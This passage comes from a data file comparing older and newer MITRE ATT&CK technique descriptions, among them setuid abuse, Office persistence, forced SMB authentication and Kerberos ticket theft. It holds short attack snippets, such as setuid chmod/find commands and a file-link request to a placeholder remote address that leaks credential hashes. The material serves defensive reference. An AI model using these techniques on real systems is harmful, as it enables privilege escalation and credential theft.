The permissions required for this action vary by system configuration; local credentials may be sufficient with direct access to the third-party system, or specific domain credentials may be required. However, the system may require an administrative account to log in or to access specific functionality."
A072,T1548.001,10.0,11.0,Setuid and Setgid,Setuid and Setgid,"An adversary may perform shell escapes or exploit vulnerabilities in an application with the setsuid or setgid bits to get code running in a different user’s context. On Linux or macOS, when the setuid or setgid bits are set for an application, the application will run with the privileges of the owning user or group respectively. (Citation: setuid man page). Normally an application is run in the current user’s context, regardless of which user or group owns the application. However, there are instances where programs need to be executed in an elevated context to function properly, but the user running them doesn’t need the elevated privileges.

Instead of creating an entry in the sudoers file, which must be done by root, any user can specify the setuid or setgid flag to be set for their own applications. These bits are indicated with an ""s"" instead of an ""x"" when viewing a file's attributes via <code>ls -l</code>. The <code>chmod</code> program can set these bits with via bitmasking, <code>chmod 4777 [file]</code> or via shorthand naming, <code>chmod u+s [file]</code>.

Adversaries can use this mechanism on their own malware to make sure they're able to execute in elevated contexts in the future.(Citation: OSX Keydnap malware).","An adversary may abuse configurations where an application has the setuid or setgid bits set in order to get code running in a different (and possibly more privileged) user’s context. On Linux or macOS, when the setuid or setgid bits are set for an application binary, the application will run with the privileges of the owning user or group respectively.(Citation: setuid man page) Normally an application is run in the current user’s context, regardless of which user or group owns the application. However, there are instances where programs need to be executed in an elevated context to function properly, but the user running them may not have the specific required privileges.

Instead of creating an entry in the sudoers file, which must be done by root, any user can specify the setuid or setgid flag to be set for their own applications (i.e. [Linux and Mac File and Directory Permissions Modification](https://attack.mitre.org/techniques/T1222/002)). The <code>chmod</code> command can set these bits with bitmasking, <code>chmod 4777 [file]</code> or via shorthand naming, <code>chmod u+s [file]</code>. This will enable the setuid bit. To enable the setgit bit, <code>chmod 2775</code> and <code>chmod g+s</code> can be used.

Adversaries can use this mechanism on their own malware to make sure they're able to execute in elevated contexts in the future.(Citation: OSX Keydnap malware) This abuse is often part of a ""shell escape"" or other actions to bypass an execution environment with restricted permissions.

Alternatively, adversaries may choose to find and target vulnerable binaries with the setuid or setgid bits already enabled (i.e. [File and Directory Discovery](https://attack.mitre.org/techniques/T1083)). The setuid and setguid bits are indicated with an ""s"" instead of an ""x"" when viewing a file's attributes via <code>ls -l</code>. The <code>find</code> command can also be used to search for such files. For example, <code>find / -perm +4000 2>/dev/null</code> can be used to find files with setuid set and <code>find / -perm +2000 2>/dev/null</code> may be used for setgid. Binaries that have these bits set may then be abused by adversaries.(Citation: GTFOBins Suid)"
A073,T1137,6.0,7.0,Office Application Startup,Office Application Startup,"Microsoft Office is a fairly common application suite on Windows-based operating systems within an enterprise network. There are multiple mechanisms that can be used with Office for persistence when an Office-based application is started.

### Office Template Macros

Microsoft Office contains templates that are part of common Office applications and are used to customize styles. The base templates within the application are used each time an application starts. (Citation: Microsoft Change Normal Template)

Office Visual Basic for Applications (VBA) macros (Citation: MSDN VBA in Office) can be inserted into the base template and used to execute code when the respective Office application starts in order to obtain persistence. Examples for both Word and Excel have been discovered and published. By default, Word has a Normal.dotm template created that can be modified to include a malicious macro. Excel does not have a template file created by default, but one can be added that will automatically be loaded.(Citation: enigma0x3 normal.dotm)(Citation: Hexacorn Office Template Macros) Shared templates may also be stored and pulled from remote locations.(Citation: GlobalDotName Jun 2019) 

Word Normal.dotm location:<code>C:\Users\\(username)\AppData\Roaming\Microsoft\Templates\Normal.dotm</code>

Excel Personal.xlsb location:<code>C:\Users\\(username)\AppData\Roaming\Microsoft\Excel\XLSTART\PERSONAL.XLSB</code>

Adversaries may also change the location of the base template to point to their own by hijacking the application's search order, e.g. Word 2016 will first look for Normal.dotm under <code>C:\Program Files (x86)\Microsoft Office\root\Office16\</code>, or by modifying the GlobalDotName registry key. By modifying the GlobalDotName registry key an adversary can specify an arbitrary location, file name, and file extension to use for the template that will be loaded on application startup. To abuse GlobalDotName, adversaries may first need to register the template as a trusted document or place it in a trusted location.(Citation: GlobalDotName Jun 2019) 

An adversary may need to enable macros to execute unrestricted depending on the system or enterprise security policy on use of macros.

### Office Test

A Registry location was found that when a DLL reference was placed within it the corresponding DLL pointed to by the binary path would be executed every time an Office application is started (Citation: Hexacorn Office Test)

<code>HKEY_CURRENT_USER\Software\Microsoft\Office test\Special\Perf</code>

### Add-ins

Office add-ins can be used to add functionality to Office programs. (Citation: Microsoft Office Add-ins)

Add-ins can also be used to obtain persistence because they can be set to execute code when an Office application starts. There are different types of add-ins that can be used by the various Office products; including Word/Excel add-in Libraries (WLL/XLL), VBA add-ins, Office Component Object Model (COM) add-ins, automation add-ins, VBA Editor (VBE), Visual Studio Tools for Office (VSTO) add-ins, and Outlook add-ins. (Citation: MRWLabs Office Persistence Add-ins)(Citation: FireEye Mail CDS 2018)

### Outlook Rules, Forms, and Home Page

A variety of features have been discovered in Outlook that can be abused to obtain persistence, such as Outlook rules, forms, and Home Page.(Citation: SensePost Ruler GitHub) These persistence mechanisms can work within Outlook or be used through Office 365.(Citation: TechNet O365 Outlook Rules)

Outlook rules allow a user to define automated behavior to manage email messages. A benign rule might, for example, automatically move an email to a particular folder in Outlook if it contains specific words from a specific sender. Malicious Outlook rules can be created that can trigger code execution when an adversary sends a specifically crafted email to that user.(Citation: SilentBreak Outlook Rules)

Outlook forms are used as templates for presentation and functionality in Outlook messages. Custom Outlook Forms can be created that will execute code when a specifically crafted email is sent by an adversary utilizing the same custom Outlook form.(Citation: SensePost Outlook Forms)

Outlook Home Page is a legacy feature used to customize the presentation of Outlook folders. This feature allows for an internal or external URL to be loaded and presented whenever a folder is opened. A malicious HTML page can be crafted that will execute code when loaded by Outlook Home Page.(Citation: SensePost Outlook Home Page)

To abuse these features, an adversary requires prior access to the user’s Outlook mailbox, either via an Exchange/OWA server or via the client application. Once malicious rules, forms, or Home Pages have been added to the user’s mailbox, they will be loaded when Outlook is started. Malicious Home Pages will execute when the right Outlook folder is loaded/reloaded while malicious rules and forms will execute when an adversary sends a specifically crafted email to the user.(Citation: SilentBreak Outlook Rules)(Citation: SensePost Outlook Forms)(Citation: SensePost Outlook Home Page)","Adversaries may leverage Microsoft Office-based applications for persistence between startups. Microsoft Office is a fairly common application suite on Windows-based operating systems within an enterprise network. There are multiple mechanisms that can be used with Office for persistence when an Office-based application is started; this can include the use of Office Template Macros and add-ins.

A variety of features have been discovered in Outlook that can be abused to obtain persistence, such as Outlook rules, forms, and Home Page.(Citation: SensePost Ruler GitHub) These persistence mechanisms can work within Outlook or be used through Office 365.(Citation: TechNet O365 Outlook Rules)"
A074,T1564.008,12.0,13.0,Email Hiding Rules,Email Hiding Rules,"Adversaries may use email rules to hide inbound emails in a compromised user's mailbox. Many email clients allow users to create inbox rules for various email functions, including moving emails to other folders, marking emails as read, or deleting emails. Rules may be created or modified within email clients or through external features such as the <code>New-InboxRule</code> or <code>Set-InboxRule</code> [PowerShell](https://attack.mitre.org/techniques/T1059/001) cmdlets on Windows systems.(Citation: Microsoft Inbox Rules)(Citation: MacOS Email Rules)(Citation: Microsoft New-InboxRule)(Citation: Microsoft Set-InboxRule)

Adversaries may utilize email rules within a compromised user's mailbox to delete and/or move emails to less noticeable folders. Adversaries may do this to hide security alerts, C2 communication, or responses to [Internal Spearphishing](https://attack.mitre.org/techniques/T1534) emails sent from the compromised account.

Any user or administrator within the organization (or adversary with valid credentials) may be able to create rules to automatically move or delete emails. These rules can be abused to impair/delay detection had the email content been immediately seen by a user or defender. Malicious rules commonly filter out emails based on key words (such as <code>malware</code>, <code>suspicious</code>, <code>phish</code>, and <code>hack</code>) found in message bodies and subject lines. (Citation: Microsoft Cloud App Security)","Adversaries may use email rules to hide inbound emails in a compromised user's mailbox. Many email clients allow users to create inbox rules for various email functions, including moving emails to other folders, marking emails as read, or deleting emails. Rules may be created or modified within email clients or through external features such as the <code>New-InboxRule</code> or <code>Set-InboxRule</code> [PowerShell](https://attack.mitre.org/techniques/T1059/001) cmdlets on Windows systems.(Citation: Microsoft Inbox Rules)(Citation: MacOS Email Rules)(Citation: Microsoft New-InboxRule)(Citation: Microsoft Set-InboxRule)

Adversaries may utilize email rules within a compromised user's mailbox to delete and/or move emails to less noticeable folders. Adversaries may do this to hide security alerts, C2 communication, or responses to [Internal Spearphishing](https://attack.mitre.org/techniques/T1534) emails sent from the compromised account.

Any user or administrator within the organization (or adversary with valid credentials) may be able to create rules to automatically move or delete emails. These rules can be abused to impair/delay detection had the email content been immediately seen by a user or defender. Malicious rules commonly filter out emails based on key words (such as <code>malware</code>, <code>suspicious</code>, <code>phish</code>, and <code>hack</code>) found in message bodies and subject lines. (Citation: Microsoft Cloud App Security)

In some environments, administrators may be able to enable email rules that operate organization-wide rather than on individual inboxes. For example, Microsoft Exchange supports transport rules that evaluate all mail an organization receives against user-specified conditions, then performs a user-specified action on mail that adheres to those conditions.(Citation: Microsoft Mail Flow Rules 2023) Adversaries that abuse such features may be able to automatically modify or delete all emails related to specific topics (such as internal security incident notifications)."
A075,T1129,10.0,11.0,Shared Modules,Shared Modules,"Adversaries may execute malicious payloads via loading shared modules. The Windows module loader can be instructed to load DLLs from arbitrary local paths and arbitrary Universal Naming Convention (UNC) network paths. This functionality resides in NTDLL.dll and is part of the Windows [Native API](https://attack.mitre.org/techniques/T1106) which is called from functions like <code>CreateProcess</code>, <code>LoadLibrary</code>, etc. of the Win32 API. (Citation: Wikipedia Windows Library Files)

The module loader can load DLLs:

* via specification of the (fully-qualified or relative) DLL pathname in the IMPORT directory;
    
* via EXPORT forwarded to another DLL, specified with (fully-qualified or relative) pathname (but without extension);
    
* via an NTFS junction or symlink program.exe.local with the fully-qualified or relative pathname of a directory containing the DLLs specified in the IMPORT directory or forwarded EXPORTs;
    
* via <code>&#x3c;file name=""filename.extension"" loadFrom=""fully-qualified or relative pathname""&#x3e;</code> in an embedded or external ""application manifest"". The file name refers to an entry in the IMPORT directory or a forwarded EXPORT.

Adversaries may use this functionality as a way to execute arbitrary payloads on a victim system. For example, malware may execute share modules to load additional components or features.","Adversaries may execute malicious payloads via loading shared modules. The Windows module loader can be instructed to load DLLs from arbitrary local paths and arbitrary Universal Naming Convention (UNC) network paths. This functionality resides in NTDLL.dll and is part of the Windows [Native API](https://attack.mitre.org/techniques/T1106) which is called from functions like <code>CreateProcess</code>, <code>LoadLibrary</code>, etc. of the Win32 API.(Citation: Wikipedia Windows Library Files)

The module loader can load DLLs:

* via specification of the (fully-qualified or relative) DLL pathname in the IMPORT directory;
    
* via EXPORT forwarded to another DLL, specified with (fully-qualified or relative) pathname (but without extension);
    
* via an NTFS junction or symlink program.exe.local with the fully-qualified or relative pathname of a directory containing the DLLs specified in the IMPORT directory or forwarded EXPORTs;
    
* via <code>&#x3c;file name=""filename.extension"" loadFrom=""fully-qualified or relative pathname""&#x3e;</code> in an embedded or external ""application manifest"". The file name refers to an entry in the IMPORT directory or a forwarded EXPORT.

Adversaries may use this functionality as a way to execute arbitrary payloads on a victim system. For example, malware may execute share modules to load additional components or features."
A076,T1560,14.0,15.0,Archive Collected Data,Archive Collected Data,"An adversary may compress and/or encrypt data that is collected prior to exfiltration. Compressing the data can help to obfuscate the collected data and minimize the amount of data sent over the network. Encryption can be used to hide information that is being exfiltrated from detection or make exfiltration less conspicuous upon inspection by a defender.

Both compression and encryption are done prior to exfiltration, and can be performed using a utility, 3rd party library, or custom method.","An adversary may compress and/or encrypt data that is collected prior to exfiltration. Compressing the data can help to obfuscate the collected data and minimize the amount of data sent over the network.(Citation: DOJ GRU Indictment Jul 2018) Encryption can be used to hide information that is being exfiltrated from detection or make exfiltration less conspicuous upon inspection by a defender.

Both compression and encryption are done prior to exfiltration, and can be performed using a utility, 3rd party library, or custom method."
A077,T1187,17.0,18.0,Forced Authentication,Forced Authentication,"Adversaries may gather credential material by invoking or forcing a user to automatically provide authentication information through a mechanism in which they can intercept.

The Server Message Block (SMB) protocol is commonly used in Windows networks for authentication and communication between systems for access to resources and file sharing. When a Windows system attempts to connect to an SMB resource it will automatically attempt to authenticate and send credential information for the current user to the remote system. (Citation: Wikipedia Server Message Block) This behavior is typical in enterprise environments so that users do not need to enter credentials to access network resources.

Web Distributed Authoring and Versioning (WebDAV) is also typically used by Windows systems as a backup protocol when SMB is blocked or fails. WebDAV is an extension of HTTP and will typically operate over TCP ports 80 and 443. (Citation: Didier Stevens WebDAV Traffic) (Citation: Microsoft Managing WebDAV Security)

Adversaries may take advantage of this behavior to gain access to user account hashes through forced SMB/WebDAV authentication. An adversary can send an attachment to a user through spearphishing that contains a resource link to an external server controlled by the adversary (i.e. [Template Injection](https://attack.mitre.org/techniques/T1221)), or place a specially crafted file on navigation path for privileged accounts (e.g. .SCF file placed on desktop) or on a publicly accessible share to be accessed by victim(s). When the user's system accesses the untrusted resource it will attempt authentication and send information, including the user's hashed credentials, over SMB to the adversary controlled server. (Citation: GitHub Hashjacking) With access to the credential hash, an adversary can perform off-line [Brute Force](https://attack.mitre.org/techniques/T1110) cracking to gain access to plaintext credentials. (Citation: Cylance Redirect to SMB)

There are several different ways this can occur. (Citation: Osanda Stealing NetNTLM Hashes) Some specifics from in-the-wild use include:

* A spearphishing attachment containing a document with a resource that is automatically loaded when the document is opened (i.e. [Template Injection](https://attack.mitre.org/techniques/T1221)). The document can include, for example, a request similar to <code>file[:]//[remote address]/Normal.dotm</code> to trigger the SMB request. (Citation: US-CERT APT Energy Oct 2017)
* A modified .LNK or .SCF file with the icon filename pointing to an external reference such as <code>\\[remote address]\pic.png</code> that will force the system to load the resource when the icon is rendered to repeatedly gather credentials. (Citation: US-CERT APT Energy Oct 2017)","Adversaries may gather credential material by invoking or forcing a user to automatically provide authentication information through a mechanism in which they can intercept.

The Server Message Block (SMB) protocol is commonly used in Windows networks for authentication and communication between systems for access to resources and file sharing. When a Windows system attempts to connect to an SMB resource it will automatically attempt to authenticate and send credential information for the current user to the remote system.(Citation: Wikipedia Server Message Block) This behavior is typical in enterprise environments so that users do not need to enter credentials to access network resources.

Web Distributed Authoring and Versioning (WebDAV) is also typically used by Windows systems as a backup protocol when SMB is blocked or fails. WebDAV is an extension of HTTP and will typically operate over TCP ports 80 and 443.(Citation: Didier Stevens WebDAV Traffic)(Citation: Microsoft Managing WebDAV Security)

Adversaries may take advantage of this behavior to gain access to user account hashes through forced SMB/WebDAV authentication. An adversary can send an attachment to a user through spearphishing that contains a resource link to an external server controlled by the adversary  (i.e. [Template Injection](https://attack.mitre.org/techniques/T1221)), or place a specially crafted file on navigation path for privileged accounts (e.g. .SCF file placed on desktop) or on a publicly accessible share to be accessed by victim(s). When the user's system accesses the untrusted resource, it will attempt authentication and send information, including the user's hashed credentials, over SMB to the adversary-controlled server.(Citation: GitHub Hashjacking) With access to the credential hash, an adversary can perform off-line [Brute Force](https://attack.mitre.org/techniques/T1110) cracking to gain access to plaintext credentials.(Citation: Cylance Redirect to SMB)

There are several different ways this can occur.(Citation: Osanda Stealing NetNTLM Hashes) Some specifics from in-the-wild use include:

* A spearphishing attachment containing a document with a resource that is automatically loaded when the document is opened (i.e. [Template Injection](https://attack.mitre.org/techniques/T1221)). The document can include, for example, a request similar to <code>file[:]//[remote address]/Normal.dotm</code> to trigger the SMB request.(Citation: US-CERT APT Energy Oct 2017)
* A modified .LNK or .SCF file with the icon filename pointing to an external reference such as <code>\\[remote address]\pic.png</code> that will force the system to load the resource when the icon is rendered to repeatedly gather credentials.(Citation: US-CERT APT Energy Oct 2017)

Alternatively, by leveraging the <code>EfsRpcOpenFileRaw</code> function, an adversary can send SMB requests to a remote system's MS-EFSRPC interface and force the victim computer to initiate an authentication procedure and share its authentication details. The Encrypting File System Remote Protocol (EFSRPC) is a protocol used in Windows networks for maintenance and management operations on encrypted data that is stored remotely to be accessed over a network. Utilization of <code>EfsRpcOpenFileRaw</code> function in EFSRPC is used to open an encrypted object on the server for backup or restore. Adversaries can collect this data and abuse it as part of a NTLM relay attack to gain access to remote systems on the same internal network.(Citation: Rapid7)(Citation: GitHub)

"
A078,T1134.002,9.0,10.0,Create Process with Token,Create Process with Token,Adversaries may create a new process with a duplicated token to escalate privileges and bypass access controls. An adversary can duplicate a desired access token with <code>DuplicateToken(Ex)</code> and use it with <code>CreateProcessWithTokenW</code> to create a new process running under the security context of the impersonated user. This is useful for creating a new process under the security context of a different user.,"Adversaries may create a new process with a different token to escalate privileges and bypass access controls. Processes can be created with the token and resulting security context of another user using features such as <code>CreateProcessWithTokenW</code> and <code>runas</code>.(Citation: Microsoft RunAs)

Creating processes with a different token may require the credentials of the target user, specific privileges to impersonate that user, or access to the token to be used (ex: gathered via other means such as [Token Impersonation/Theft](https://attack.mitre.org/techniques/T1134/001) or [Make and Impersonate Token](https://attack.mitre.org/techniques/T1134/003))."
A079,T1558,9.0,10.0,Steal or Forge Kerberos Tickets,Steal or Forge Kerberos Tickets,"Adversaries may attempt to subvert Kerberos authentication by stealing or forging Kerberos tickets to enable [Pass the Ticket](https://attack.mitre.org/techniques/T1550/003). 

Kerberos is an authentication protocol widely used in modern Windows domain environments. In Kerberos environments, referred to as “realms”, there are three basic participants: client, service, and Key Distribution Center (KDC).(Citation: ADSecurity Kerberos Ring Decoder) Clients request access to a service and through the exchange of Kerberos tickets, originating from KDC, they are granted access after having successfully authenticated. The KDC is responsible for both authentication and ticket granting.  Attackers may attempt to abuse Kerberos by stealing tickets or forging tickets to enable unauthorized access.","Adversaries may attempt to subvert Kerberos authentication by stealing or forging Kerberos tickets to enable [Pass the Ticket](https://attack.mitre.org/techniques/T1550/003). Kerberos is an authentication protocol widely used in modern Windows domain environments. In Kerberos environments, referred to as “realms”, there are three basic participants: client, service, and Key Distribution Center (KDC).(Citation: ADSecurity Kerberos Ring Decoder) Clients request access to a service and through the exchange of Kerberos tickets, originating from KDC, they are granted access after having successfully authenticated. The KDC is responsible for both authentication and ticket granting.  Attackers may attempt to abuse Kerberos by stealing tickets or forging tickets to enable unauthorized access.

On Windows, the built-in <code>klist</code> utility can be used to list and analyze cached Kerberos tickets.(Citation: Microsoft Klist)

Linux systems on Active Directory domains store Kerberos credentials locally in the credential cache file referred to as the ""ccache"". The credentials are stored in the ccache file while they remain valid and generally while a user's session lasts.(Citation: MIT ccache) On modern Redhat Enterprise Linux systems, and derivative distributions, the System Security Services Daemon (SSSD) handles Kerberos tickets. By default SSSD maintains a copy of the ticket database that can be found in <code>/var/lib/sss/secrets/secrets.ldb</code> as well as the corresponding key located in <code>/var/lib/sss/secrets/.secrets.mkey</code>. Both files require root access to read. If an adversary is able to access the database and key, the credential cache Kerberos blob can be extracted and converted into a usable Kerberos ccache file that adversaries may use for [Pass the Ticket](https://attack.mitre.org/techniques/T1550/003). The ccache file may also be converted into a Windows format using tools such as Kekeo.(Citation: Linux Kerberos Tickets)(Citation: Brining MimiKatz to Unix)(Citation: Kekeo)


Kerberos tickets on macOS are stored in a standard ccache format, similar to Linux. By default, access to these ccache entries is federated through the KCM daemon process via the Mach RPC protocol, which uses the caller's environment to determine access. The storage location for these ccache entries is influenced by the <code>/etc/krb5.conf</code> configuration file and the <code>KRB5CCNAME</code> environment variable which can specify to save them to disk or keep them protected via the KCM daemon. Users can interact with ticket storage using <code>kinit</code>, <code>klist</code>, <code>ktutil</code>, and <code>kcc</code> built-in binaries or via Apple's native Kerberos framework. Adversaries can use open source tools to interact with the ccache files directly or to use the Kerberos framework to call lower-level APIs for extracting the user's TGT or Service Tickets.(Citation: SpectorOps Bifrost Kerberos macOS 2019)(Citation: macOS kerberos framework MIT)
"
A080,T1480,6.0,7.0,Execution Guardrails,Execution Guardrails,"Execution guardrails constrain execution or actions based on adversary supplied environment specific conditions that are expected to be present on the target. 

Guardrails ensure that a payload only executes against an intended target and reduces collateral damage from an adversary’s campaign.(Citation: FireEye Kevin Mandia Guardrails) Values an adversary can provide about a target system or environment to use as guardrails may include specific network share names, attached physical devices, files, joined Active Directory (AD) domains, and local/external IP addresses.

Environmental keying is one type of guardrail that includes cryptographic techniques for deriving encryption/decryption keys from specific types of values in a given computing environment.(Citation: EK Clueless Agents) Values can be derived from target-specific elements and used to generate a decryption key for an encrypted payload. Target-specific values can be derived from specific network shares, physical devices, software/software versions, files, joined AD domains, system time, and local/external IP addresses.(Citation: Kaspersky Gauss Whitepaper)(Citation: Proofpoint Router Malvertising)(Citation: EK Impeding Malware Analysis)(Citation: Environmental Keyed HTA)(Citation: Ebowla: Genetic Malware) By generating the decryption keys from target-specific environmental values, environmental keying can make sandbox detection, anti-virus detection, crowdsourcing of information, and reverse engineering difficult.(Citation: Kaspersky Gauss Whitepaper)(Citation: Ebowla: Genetic Malware) These difficulties can slow down the incident response process and help adversaries hide their tactics, techniques, and procedures (TTPs).

Similar to [Obfuscated Files or Information](https://attack.mitre.org/techniques/T1027), adversaries may use guardrails and environmental keying to help protect their TTPs and evade detection. For example, environmental keying may be used to deliver an encrypted payload to the target that will use target-specific values to decrypt the payload before execution.(Citation: Kaspersky Gauss Whitepaper)(Citation: EK Impeding Malware Analysis)(Citation: Environmental Keyed HTA)(Citation: Ebowla: Genetic Malware)(Citation: Demiguise Guardrail Router Logo) By utilizing target-specific values to decrypt the payload the adversary can avoid packaging the decryption key with the payload or sending it over a potentially monitored network connection. Depending on the technique for gathering target-specific values, reverse engineering of the encrypted payload can be exceptionally difficult.(Citation: Kaspersky Gauss Whitepaper) In general, guardrails can be used to prevent exposure of capabilities in environments that are not intended to be compromised or operated within. This use of guardrails is distinct from typical [Virtualization/Sandbox Evasion](https://attack.mitre.org/techniques/T1497) where a decision can be made not to further engage because the value conditions specified by the adversary are meant to be target specific and not such that they could occur in any environment.","Adversaries may use execution guardrails to constrain execution or actions based on adversary supplied and environment specific conditions that are expected to be present on the target. Guardrails ensure that a payload only executes against an intended target and reduces collateral damage from an adversary’s campaign.(Citation: FireEye Kevin Mandia Guardrails) Values an adversary can provide about a target system or environment to use as guardrails may include specific network share names, attached physical devices, files, joined Active Directory (AD) domains, and local/external IP addresses.(Citation: FireEye Outlook Dec 2019)

Guardrails can be used to prevent exposure of capabilities in environments that are not intended to be compromised or operated within. This use of guardrails is distinct from typical [Virtualization/Sandbox Evasion](https://attack.mitre.org/techniques/T1497). While use of [Virtualization/Sandbox Evasion](https://attack.mitre.org/techniques/T1497) may involve checking for known sandbox values and continuing with execution only if there is no match, the use of guardrails will involve checking for an expected target-specific value and only continuing with execution if there is such a match."
A081,T1087,14.0,15.0,Account Discovery,Account Discovery,"Adversaries may attempt to get a listing of valid accounts, usernames, or email addresses on a system or within a compromised environment. This information can help adversaries determine which accounts exist, which can aid in follow-on behavior such as brute-forcing, spear-phishing attacks, or account takeovers (e.g., [Valid Accounts](https://attack.mitre.org/techniques/T1078)).

Adversaries may use several methods to enumerate accounts, including abuse of existing tools, built-in commands, and potential misconfigurations that leak account names and roles or permissions in the targeted environment.

For examples, cloud environments typically provide easily accessible interfaces to obtain user lists. On hosts, adversaries can use default [PowerShell](https://attack.mitre.org/techniques/T1059/001) and other command line functionality to identify accounts. Information about email addresses and accounts may also be extracted by searching an infected system’s files.","Adversaries may attempt to get a listing of valid accounts, usernames, or email addresses on a system or within a compromised environment. This information can help adversaries determine which accounts exist, which can aid in follow-on behavior such as brute-forcing, spear-phishing attacks, or account takeovers (e.g., [Valid Accounts](https://attack.mitre.org/techniques/T1078)).

Adversaries may use several methods to enumerate accounts, including abuse of existing tools, built-in commands, and potential misconfigurations that leak account names and roles or permissions in the targeted environment.

For examples, cloud environments typically provide easily accessible interfaces to obtain user lists.(Citation: AWS List Users)(Citation: Google Cloud - IAM Servie Accounts List API) On hosts, adversaries can use default [PowerShell](https://attack.mitre.org/techniques/T1059/001) and other command line functionality to identify accounts. Information about email addresses and accounts may also be extracted by searching an infected system’s files."
A082,T1564.003,16.0,17.0,Hidden Window,Hidden Window,"Adversaries may use hidden windows to conceal malicious activity from the plain sight of users. In some cases, windows that would typically be displayed when an application carries out an operation can be hidden. This may be utilized by system administrators to avoid disrupting user work environments when carrying out administrative tasks. 

Adversaries may abuse these functionalities to hide otherwise visible windows from users so as not to alert the user to adversary activity on the system.(Citation: Antiquated Mac Malware)

On macOS, the configurations for how applications run are listed in property list (plist) files. One of the tags in these files can be <code>apple.awt.UIElement</code>, which allows for Java applications to prevent the application's icon from appearing in the Dock. A common use for this is when applications run in the system tray, but don't also want to show up in the Dock.

Similarly, on Windows there are a variety of features in scripting languages, such as [PowerShell](https://attack.mitre.org/techniques/T1059/001), Jscript, and [Visual Basic](https://attack.mitre.org/techniques/T1059/005) to make windows hidden. One example of this is <code>powershell.exe -WindowStyle Hidden</code>.(Citation: PowerShell About 2019)

In addition, Windows supports the `CreateDesktop()` API that can create a hidden desktop window with its own corresponding <code>explorer.exe</code> process.(Citation: Hidden VNC)(Citation: Anatomy of an hVNC Attack)  All applications running on the hidden desktop window, such as a hidden VNC (hVNC) session,(Citation: Hidden VNC) will be invisible to other desktops windows.","Adversaries may use hidden windows to conceal malicious activity from the plain sight of users. In some cases, windows that would typically be displayed when an application carries out an operation can be hidden. This may be utilized by system administrators to avoid disrupting user work environments when carrying out administrative tasks. 

Adversaries may abuse these functionalities to hide otherwise visible windows from users so as not to alert the user to adversary activity on the system.(Citation: Antiquated Mac Malware)

On macOS, the configurations for how applications run are listed in property list (plist) files. One of the tags in these files can be <code>apple.awt.UIElement</code>, which allows for Java applications to prevent the application's icon from appearing in the Dock. A common use for this is when applications run in the system tray, but don't also want to show up in the Dock.

Similarly, on Windows there are a variety of features in scripting languages, such as [PowerShell](https://attack.mitre.org/techniques/T1059/001), Jscript, and [Visual Basic](https://attack.mitre.org/techniques/T1059/005) to make windows hidden. One example of this is <code>powershell.exe -WindowStyle Hidden</code>.(Citation: PowerShell About 2019)

The Windows Registry can also be edited to hide application windows from the current user. For example, by setting the `WindowPosition` subkey in the `HKEY_CURRENT_USER\Console\%SystemRoot%_System32_WindowsPowerShell_v1.0_PowerShell.exe` Registry key to a maximum value, PowerShell windows will open off screen and be hidden.(Citation: Cantoris Computing)

In addition, Windows supports the `CreateDesktop()` API that can create a hidden desktop window with its own corresponding <code>explorer.exe</code> process.(Citation: Hidden VNC)(Citation: Anatomy of an hVNC Attack)  All applications running on the hidden desktop window, such as a hidden VNC (hVNC) session,(Citation: Hidden VNC) will be invisible to other desktops windows."
A083,T1089,2.0,3.0,Disabling Security Tools,Disabling Security Tools,"Adversaries may disable security tools to avoid possible detection of their tools and activities. This can take the form of killing security software or event logging processes, deleting Registry keys so that tools do not start at run time, or other methods to interfere with security scanning or event reporting.

Detection: Monitor processes and command-line arguments to see if security tools are killed or stop running. Monitor Registry edits for modifications to services and startup programs that correspond to security tools. Lack of log or event file reporting may be suspicious.

Platforms: Linux, macOS, Windows

Data Sources: API monitoring, Anti-virus, File monitoring, Services, Windows Registry, Process command-line parameters

Defense Bypassed: Anti-virus, File monitoring, Host intrusion prevention systems, Signature-based detection, Log analysis","Adversaries may disable security tools to avoid possible detection of their tools and activities. This can take the form of killing security software or event logging processes, deleting Registry keys so that tools do not start at run time, or other methods to interfere with security scanning or event reporting."
A084,T1187,2.0,3.0,Forced Authentication,Forced Authentication,"The Server Message Block (SMB) protocol is commonly used in Windows networks for authentication and communication between systems for access to resources and file sharing. When a Windows system attempts to connect to an SMB resource it will automatically attempt to authenticate and send credential information for the current user to the remote system.  (Citation: Wikipedia Server Message Block) This behavior is typical in enterprise environments so that users do not need to enter credentials to access network resources. Web Distributed Authoring and Versioning (WebDAV) is typically used by Windows systems as a backup protocol when SMB is blocked or fails. WebDAV is an extension of HTTP and will typically operate over TCP ports 80 and 443. (Citation: Didier Stevens WebDAV Traffic) (Citation: Microsoft Managing WebDAV Security)

Adversaries may take advantage of this behavior to gain access to user account hashes through forced SMB authentication. An adversary can send an attachment to a user through spearphishing that contains a resource link to an external server controlled by the adversary, or place a specially crafted file on navigation path for privileged accounts (e.g. .SCF file placed on desktop) or on a publicly accessible share to be accessed by victim(s). When the user's system accesses the untrusted resource it will attempt authentication and send information including the user's hashed credentials over SMB to the adversary controlled server. (Citation: GitHub Hashjacking) With access to the credential hash, an adversary can perform off-line Brute Force cracking to gain access to plaintext credentials, or reuse it for Pass the Hash. (Citation: Cylance Redirect to SMB)

There are several different ways this can occur. (Citation: Osanda Stealing NetNTLM Hashes) Some specifics from in-the-wild use include:
*A spearphishing attachment containing a document with a resource that is automatically loaded when the document is opened. The document can include, for example, a request similar to <code>file[:]//[remote address]/Normal.dotm</code> to trigger the SMB request. (Citation: US-CERT APT Energy Oct 2017)
*A modified .LNK or .SCF file with the icon filename pointing to an external reference such as <code>\\[remote address]\pic.png</code> that will force the system to load the resource when the icon is rendered to repeatedly gather credentials. (Citation: US-CERT APT Energy Oct 2017)

Detection: Monitor for SMB traffic on TCP ports 139, 445 and UDP port 137 and WebDAV traffic attempting to exit the network to unknown external systems. If attempts are detected, then investigate endpoint data sources to find the root cause.

Monitor creation and modification of .LNK, .SCF, or any other files on systems and within virtual environments that contain resources that point to external network resources as these could be used to gather credentials when the files are rendered. (Citation: US-CERT APT Energy Oct 2017)

Platforms: Windows

Data Sources: File monitoring, Network protocol analysis, Network device logs, Process use of network

Permissions Required: User

Contributors: Teodor Cimpoesu, Sudhanshu Chauhan, @Sudhanshu_C","The Server Message Block (SMB) protocol is commonly used in Windows networks for authentication and communication between systems for access to resources and file sharing. When a Windows system attempts to connect to an SMB resource it will automatically attempt to authenticate and send credential information for the current user to the remote system. (Citation: Wikipedia Server Message Block) This behavior is typical in enterprise environments so that users do not need to enter credentials to access network resources. Web Distributed Authoring and Versioning (WebDAV) is typically used by Windows systems as a backup protocol when SMB is blocked or fails. WebDAV is an extension of HTTP and will typically operate over TCP ports 80 and 443. (Citation: Didier Stevens WebDAV Traffic) (Citation: Microsoft Managing WebDAV Security)

